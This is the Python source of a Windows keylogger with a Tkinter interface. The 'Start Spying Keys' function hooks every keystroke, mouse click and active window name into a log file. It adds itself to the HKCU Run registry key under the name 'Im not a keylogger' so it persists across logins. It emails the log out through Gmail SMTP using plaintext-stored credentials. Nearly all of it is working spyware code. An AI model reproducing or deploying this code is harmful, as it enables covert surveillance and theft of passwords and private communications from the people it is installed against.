# ========= importing Modules ========

from tkinter import*
from tkinter import ttk
from tkinter import messagebox
from PIL import ImageTk, Image
import time
import sys
from email.message import EmailMessage
import win32api
import pythoncom
import pyHook
import os
import smtplib
from winreg import*

# =============Main Program Starts =============


class keylogger():
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger".center(300))
        self.root.geometry("1000x510+200+75")
        self.root.resizable(False, False)
        self.root.config(bg="black")

# ===========Icons and Variables ================
# ===========Icons and Variables ================
# ===========Icons and Variables ================
# ===========Icons and Variables ================

        self.pass_l = StringVar()
        self.bg_img = ImageTk.PhotoImage(
            file="Pics\pandasecurity-MC-keylogger-HP.jpg")
        self.show_icon = ImageTk.PhotoImage(file="Pics\show-password.png")

# =============Top Frame =========================
# =============Top Frame =========================
# =============Top Frame =========================
# =============Top Frame =========================

        self.TopFrame = LabelFrame(self.root, bd=10, text="KEYLOGGER", fg="gold", relief=GROOVE, font=(
            "times new roman", 20, "bold"), bg="#081923")
        self.TopFrame.place(x=0, y=0, height=135, relwidth=1)

        self.TopFrame_bg_img = Label(
            self.root, bd=10, image=self.bg_img, bg="#081923")  # For background Img
        self.TopFrame_bg_img.place(x=0, y=130, relwidth=1)

    # =================== For Digital Clock ======================

        self.lbl_hr = Label(self.TopFrame, text="12", font=(
            "times new roman", 30, "bold"), bg="#0B7587", fg="white")
        self.lbl_hr.place(x=10, y=5, height=50, width=80)

        self.lbl_hr2 = Label(self.TopFrame, text="Hours", font=(
            "times new roman", 12, "bold"), bg="#0B7587", fg="white")
        self.lbl_hr2.place(x=10, y=60, height=20, width=80)

        self.lbl_min = Label(self.TopFrame, text="12", font=(
            "times new roman", 30, "bold"), bg="#3CA59D", fg="white")
        self.lbl_min.place(x=100, y=5, height=50, width=80)

        self.lbl_min2 = Label(self.TopFrame, text="Minutes", font=(
            "times new roman", 12, "bold"), bg="#3CA59D", fg="white")
        self.lbl_min2.place(x=100, y=60, height=20, width=80)

        self.lbl_sec = Label(self.TopFrame, text="12", font=(
            "times new roman", 30, "bold"), bg="#F62217", fg="white")
        self.lbl_sec.place(x=190, y=5, height=50, width=80)

        self.lbl_sec2 = Label(self.TopFrame, text="Seconds", font=(
            "times new roman", 12, "bold"), bg="#F62217", fg="white")
        self.lbl_sec2.place(x=190, y=60, height=20, width=80)

        self.lbl_abv = Label(self.TopFrame, text="AM", font=(
            "times new roman", 30, "bold"), bg="#F62217", fg="white")
        self.lbl_abv.place(x=280, y=5, height=50, width=80)

        self.lbl_abv2 = Label(self.TopFrame, text="Morning", font=(
            "times new roman", 10, "bold"), bg="#F62217", fg="white")
        self.lbl_abv2.place(x=280, y=60, height=20, width=80)

        self.Button1_T= Button(self.TopFrame, bd=5, relief = GROOVE, font=("times new roman",10,"bold"), text = "Email Credentials",fg="white", bg="red", cursor="hand2", command=self.setting_win)
        self.Button1_T.place(x=850,y=0, width=120, height=40)

        self.clock()

# =============Left Frame =========================
# =============Left Frame =========================
# =============Left Frame =========================
# =============Left Frame =========================

        self.LeftFrame = Frame(self.root, bd=10, relief=GROOVE,bg="#081923")
        self.LeftFrame.place(x=0, y=140, height=370, width=160)

        self.Button1= Button(self.LeftFrame, bd=5, relief = GROOVE, font=("times new roman",15,"bold"), text = "Start Spying\n Keys",fg="white", bg="green", cursor="hand2", command=self.spy)
        self.Button1.place(x=0,y=0, width=140, height=70)

        self.Button2= Button(self.LeftFrame, bd=5, relief = GROOVE, font=("times new roman",15,"bold"), text = "Show Log File",fg="white", bg="#081923", cursor="hand2", command=self.showlog)
        self.Button2.place(x=0,y=70, width=140, height=70)

        self.Button3= Button(self.LeftFrame, bd=5, relief = GROOVE, font=("times new roman",15,"bold"), text = "Send Log \nto Email",fg="white", bg="#081923", cursor="hand2", command=self.to_win)
        self.Button3.place(x=0,y=140, width=140, height=70)

        self.Button4= Button(self.LeftFrame, bd=5, relief = GROOVE, font=("times new roman",15,"bold"), text = "Clear",fg="white", bg="#FADA5E", cursor="hand2", command=self.clear)
        self.Button4.place(x=0,y=210, width=140, height=70)

        self.Button5= Button(self.LeftFrame, bd=5, relief = GROOVE, font=("times new roman",15,"bold"), text = "Exit",fg="white", bg="red", cursor="hand2", command= self.Exit)
        self.Button5.place(x=0,y=280, width=140, height=70)
    
# =============Middle Frame =========================
# =============Middle Frame =========================
# =============Middle Frame =========================
# =============Middle Frame =========================

        self.show_entry = Text(self.root,fg="white",bd=10,font=("times new roman",15,"bold"), bg="black")
        self.show_entry.place(x=180, y=165, width=790, height=320)

        scroll_x = Scrollbar(self.show_entry, cursor= "hand2", orient = HORIZONTAL)
        scroll_y = Scrollbar(self.show_entry, cursor= "hand2", orient = VERTICAL)
        scroll_x.pack(side=BOTTOM, fill=X)
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_x.config(command=self.show_entry.xview)
        scroll_y.config(command=self.show_entry.yview)
        self.show_entry.config(yscrollcommand = scroll_y)
        self.show_entry.config(xscrollcommand = scroll_x)

#=================== Functions ============================
#=================== Functions ============================
#=================== Functions ============================
#=================== Functions ============================

    def clear(self):
        self.show_entry.delete("1.0",END)

    def Exit(self): #Exit
        a= messagebox.askokcancel("Ask","Do you Really want to Exit")
        if a >0:
            self.root.destroy()
        else:
            pass

    def showlog(self):  # SHOWING lOG
        try:
            with open("Logfile.txt","r") as f:
                self.show_entry.insert("1.0",f.read())
        except Exception:
            messagebox.showerror("Error","No Log File Exist")

    def setting_win(self):
        self.check_exist_file()
        self.root2 = Toplevel() # CHILD WINDOW
        self.root2.title("Setting")
        self.root2.geometry("700x320+350+150")
        self.root2.config(bg="black")
        self.root2.focus_force()
        self.root2.grab_set()
        self.root2.resizable(False, False)



        #==========================Title of Child Window==============================
        #==========================Title of Child Window==============================
        #==========================Title of Child Window==============================
        #==========================Title of Child Window==============================

        title_child = Label(self.root2, text="Credentials Settings", bg = "#152238", fg = "white", compound=LEFT, font=("Goudy Old Style", 48, "bold"), anchor="w")
        title_child.place(x=0,y=0,relwidth=1)

        sub_title_child = Label(self.root2, text="Enter Email address and password from which you want to send mail", bg = "yellow",font=("Calibri(Body)", 14, "bold"), anchor="w")
        sub_title_child.place(x=0,y=85,relwidth=1)

        from_lbl = Label(self.root2, text="Email Address", bg = "black",font=("times new roman",20,"bold"), fg="white")
        from_lbl.place(x=30,y=140)

        pass_lbl = Label(self.root2, text="Password", bg = "black",font=("times new roman",20,"bold"), fg="white")
        pass_lbl.place(x=30,y=200)

        
        self.from_entry=Entry(self.root2, width =30,bd=5,bg="lightgrey", font=("times new roman",18))
        self.from_entry.place(x=220,y=140)

        self.pass_entry=Entry(self.root2,show="*", width =30,bd=5,bg="lightgrey", font=("times new roman",18))
        self.pass_entry.place(x=220,y=200)

        self.show_pass_btn = Button(self.root2, image =self.show_icon, activebackground="black", bg="black", cursor="hand2", command=self.show)
        self.show_pass_btn.place(x=595, y=195)    
        
        self.save_ = Button(self.root2, text="Save",bd=5 ,relief=GROOVE,activeforeground="white", activebackground="#00B0F0", fg="white",font=("times new roman",18,"bold"),bg="#00B0F0", cursor="hand2", command=self.save)
        self.save_.place(x=300, y=250, width=140, height=30)    
        
        self.clear_ = Button(self.root2, text="Clear",bd=5 ,relief=GROOVE,activeforeground="white", activebackground="#262626", fg="white",font=("times new roman",18,"bold"),bg="#262626", cursor="hand2", command=self.clear2)
        self.clear_.place(x=495, y=250, width=140, height=30)    
                
        self.pass_lbl = Entry(self.root2, textvariable=self.pass_l,font=("times new roman",10), fg="grey")
        self.pass_lbl.place(x=0,y=115, width= 140)
        self.pass_l.set("Password Mode: Hidden")
        self.pass_lbl.config(state="disable")

    def clear2(self):
        self.from_entry.delete(0,END)
        self.pass_entry.delete(0,END)

    def check_exist_file(self):  # Checking Existance of File
        if os.path.exists("credentials.txt")==False:
            f=open("credentials.txt","w")
            f.write(",")
            f.close()
        f2 = open("credentials.txt","r")
        self.credentials = []
        for i in f2:
            self.credentials.append([i.split(",")[0],i.split(",")[1]])

        self.from_= self.credentials[0][0]
        self.pass_= self.credentials[0][1]

    def save(self): #Save Credentials
        if self.from_entry.get()=="" or self.pass_entry.get()=="":
            return messagebox.showerror("Error","All Fields are required", parent=self.root2)
        elif "@" not in self.from_entry.get():
            return messagebox.showerror("Error","Email should have "@" character",parent=self.root2)
        else:
            try:
                f=open("credentials.txt","w")
                f.write(str(self.from_entry.get()+","+str(self.pass_entry.get())))
                f.close()
                messagebox.showinfo("Info","Email Saved", parent= self.root2)
                self.check_exist_file()
            except Exception:
                return messagebox.showerror("Error","Something Wrong!!")

    def show(self): # Password Show and hide function
        a = self.pass_entry.get()
        if self.pass_l.get() == "Password Mode: Hidden":
            self.pass_lbl.config(state="normal")
            self.pass_l.set("Password Mode: Shown")
            self.pass_lbl.config(state="disable")
            self.pass_entry=Entry(self.root2,width =30,bd=5,bg="lightgrey", font=("times new roman",18))
            self.pass_entry.place(x=220,y=200)
            self.pass_entry.insert(0,a)
        elif self.pass_l.get() == "Password Mode: Shown":
            self.pass_lbl.config(state="normal")
            self.pass_l.set("Password Mode: Hidden")
            self.pass_lbl.config(state="disable")
            self.pass_entry=Entry(self.root2, show="*",width =30,bd=5,bg="lightgrey", font=("times new roman",18))
            self.pass_entry.place(x=220,y=200)
            self.pass_entry.insert(0,a)

    def to_win(self):
        a = messagebox.askokcancel("Info","Add Email Credentials if not added for further process.\n Do you want to continue")
        if a>0:
            self.check_exist_file()
            self.root3 = Toplevel() # CHILD WINDOW
            self.root3.title("Setting")
            self.root3.geometry("700x250+350+150")
            self.root3.config(bg="black")
            self.root3.focus_force()
            self.root3.grab_set()
            self.root3.resizable(False, False)

            #==========================Title of Child Window==============================
            #==========================Title of Child Window==============================
            #==========================Title of Child Window==============================
            #==========================Title of Child Window==============================

            title_child = Label(self.root3, text="Person to Send Mail", bg = "#152238", fg = "white", compound=LEFT, font=("Goudy Old Style", 48, "bold"), anchor="w")
            title_child.place(x=0,y=0,relwidth=1)

            sub_title_child = Label(self.root3, text="Enter Email address to whom you want to send mail", bg = "yellow",font=("Calibri(Body)", 14, "bold"), anchor="w")
            sub_title_child.place(x=0,y=85,relwidth=1)

            to_lbl = Label(self.root3, text="Email Address", bg = "black",font=("times new roman",20,"bold"), fg="white")
            to_lbl.place(x=30,y=140)
    
            self.to_entry=Entry(self.root3, width =30,bd=5,bg="lightgrey", font=("times new roman",18))
            self.to_entry.place(x=220,y=140)
        
            self.send = Button(self.root3, text="Send",bd=5 ,relief=GROOVE,activeforeground="white", activebackground="#00B0F0", fg="white",font=("times new roman",18,"bold"),bg="#00B0F0", cursor="hand2", command=self.sendemail)
            self.send.place(x=450, y=200, width=140, height=30)    
                
    def sendemail(self): # Sending Email
        send = smtplib.SMTP("smtp.gmail.com", 587) # Create session for Gmail
        send.starttls() #transport layer

        f2 = open("credentials.txt","r")
        credentials = []
        for i in f2:
            credentials.append([i.split(",")[0],i.split(",")[1]])

        from_= credentials[0][0]
        pass_= credentials[0][1]

        # Message building 

        msg = EmailMessage()
        msg["From"] = from_
        msg["To"]  = self.to_entry.get()

        try:
            send.login(from_,pass_) # Email Login Using sae Email/ Pasword
        except smtplib.SMTPAuthenticationError:
            messagebox.showerror("Error","Username or Password is Wrong")

        # attaching the log file
        try:
            with open("Logfile.txt","rb") as f:
                file_data = f.read()
                file_name = f.name
                msg.add_attachment(file_data,  subtype="octet-stream", maintype="application", filename=file_name)
        except Exception:
            return messagebox.showerror("Error","Logfile not Exist Mail not Sent")

        try:
            try:
                try:
                    send.send_message(msg) #sending Message with Error exception to protect with error
                    messagebox.showinfo("Info","Successfully Mailed Your Content")
                except smtplib.SMTPRecipientsRefused:
                    messagebox.showerror("Error","Mail Not Sent")
            except smtplib.SMTPException:
                messagebox.showerror("Error","Mail Not Sent")
        except smtplib.SMTPConnectError:
            messagebox.showerror("Error","Mail Not Sent")

    def spy(self):
        messagebox.showwarning("Warning","Are You Sure to star Spy as You Can Stop Only By Shuting Down Your System")
        a= messagebox.askokcancel("Ask","Do You Want to Continue")
        if a>0:
            global t
            t=""
            try:
                f = open("Logfile.txt", "a")
                f.close()
            except:
                f = open("Logfile.txt", "w")
                f.close()

            def addStartup():  # this will add the file to the startup registry key
                fp = os.path.dirname(os.path.realpath(__file__))
                file_name = sys.argv[0].split("\\")[-1]
                new_file_path = fp + "\\" + file_name
                keyVal = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
                SetValueEx(key2change, "Im not a keylogger", 0, REG_SZ,
                        new_file_path)
    
            addStartup()

            def OnMouseEvent(event):
                data = "\n[" + str(time.ctime().split(" ")[3]) + "]" \
                    + " WindowName : " + str(event.WindowName)
                data += "\n\tButton:" + str(event.MessageName)
                data += "\n\tClicked in (Position):" + str(event.Position)
                data += "\n===================="
                global t, start_time

                t = t + data
                if len(t) > 500:
                    f = open("Logfile.txt", "a")
                    f.write(t)
                    f.close()
                    t = ""
                return True

            def OnKeyboardEvent(event):
                data = "\n[" + str(time.ctime().split(" ")[3]) + "]" \
                    + " WindowName : " + str(event.WindowName)
                data += "\n\tKeyboard key :" + str(event.Key)
                data += "\n===================="
                global t, start_time
                t = t + data

                if len(t) > 500:
                    f = open("Logfile.txt", "a")
                    f.write(t)
                    f.close()
                    t = ""
                return True

            hook = pyHook.HookManager()
            hook.KeyDown = OnKeyboardEvent
            hook.MouseAllButtonsDown = OnMouseEvent
            hook.HookKeyboard()
            hook.HookMouse()
            start_time = time.time()

            pythoncom.PumpMessages()

    def clock(self): # CALLING CLOCK
        self.h = str(time.strftime("%H"))
        self.m = str(time.strftime("%M"))
        self.s = str(time.strftime("%S"))

        if int(self.h) > 12 and int(self.h) < 15 and int(self.m) > 0:
            self.lbl_abv.config(text="PM")
            self.lbl_abv2.config(text="NOON")
        if int(self.h) >= 15 and int(self.h) < 20 and int(self.m) > 0:
            self.lbl_abv.config(text="PM")
            self.lbl_abv2.config(text="EVENING")
        if int(self.h) >= 20 and int(self.h) < 24 and int(self.m) > 0:
            self.lbl_abv.config(text="PM")
            self.lbl_abv2.config(text="NIGHT")
        if int(self.h) >= 0 and int(self.h) < 12 and int(self.m) > 0:
            self.lbl_abv.config(text="AM")
            self.lbl_abv2.config(text="MORNING")
        if int(self.h) > 12:
            self.h = str(int(self.h) % 12)

        self.lbl_hr.config(text=self.h)
        self.lbl_min.config(text=self.m)
        self.lbl_sec.config(text=self.s)
        self.lbl_hr.after(200, self.clock)


root = Tk()
obj = keylogger(root)
root.mainloop()
